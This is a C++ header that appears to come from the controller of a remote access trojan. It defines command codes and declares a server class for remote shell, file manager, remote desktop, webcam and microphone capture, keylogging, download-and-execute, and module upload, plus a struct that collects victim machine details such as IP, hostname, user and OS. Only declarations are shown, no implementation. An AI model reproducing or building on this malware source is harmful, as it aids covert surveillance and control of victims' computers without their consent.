#pragma once
#include "EventHandler.h"
	

#define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))



#define KNEL_LOGIN (0xee01)
//
#define KNEL_READY			(0x4552)

#define KNEL_POWER_REBOOT	(0xee02)
#define KNEL_POWER_SHUTDOWN	(0xee03)
#define KNEL_RESTART		(0xea04)


#define KNEL_EDITCOMMENT	(0xee04)
#define KNEL_EDITCOMMENT_OK	(0xee05)


#define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
#define KNEL_UPLOAD_MODULE_FORMURL		(0xee09)

#define KNEL_MODULE_BUSY				(0xdd00)
#define KNEL_CMD						(0xdd01)
#define KNEL_CHAT						(0xdd02)
#define KNEL_FILEMGR					(0xdd03)
#define KNEL_DESKTOP					(0xdd04)
#define KNEL_CAMERA						(0xdd05)
#define KNEL_MICROPHONE					(0xdd06)
#define KNEL_DOWNANDEXEC				(0xdd07)
#define KNEL_EXIT						(0xdd08)
#define KNEL_KEYBD_LOG					(0xdd09)

#define KNEL_GETMODULE		(0xea05)
#define KNEL_MODULE			(0xea07)



class CKernelSrv :
	public CEventHandler
{
public:
	typedef struct LoginInfo
	{
		WCHAR szPrivateIP[128];				//
		WCHAR szHostName[128];
		WCHAR szUser[128];
		WCHAR szOsName[128];
		WCHAR szInstallDate[128];
		WCHAR szCPU[128];
		WCHAR szDisk_RAM[128];
		DWORD dwHasCamera;
		DWORD dwPing;
		WCHAR szComment[256];

	}LoginInfo;
	
private:
	HWND m_hClientList;
	void OnClose() ;	
	void OnConnect();		


	void OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer);

	void OnLogin(LoginInfo *pLi);
	void OnGetModule(const char*ModuleName);
public:
	void EditComment(WCHAR *Comment);
	void Power_Reboot();
	void Power_Shutdown();
	void Restart();

	void UploadModuleFromDisk(WCHAR* Path);
	void UploadModuleFromUrl(WCHAR* Url);

	void BeginCmd();
	void BeginChat();
	void BeginFileMgr();
	void BeginRemoteDesktop();
	void BeginCamera();
	void BeginMicrophone();
	void BeginDownloadAndExec(WCHAR szUrl[]);
	void BeginExit();
	void BeginKeyboardLog();

	//----------------------------------------------
	void OnModuleBusy();
	CKernelSrv(HWND hClientList, DWORD Identity);
	~CKernelSrv();
};

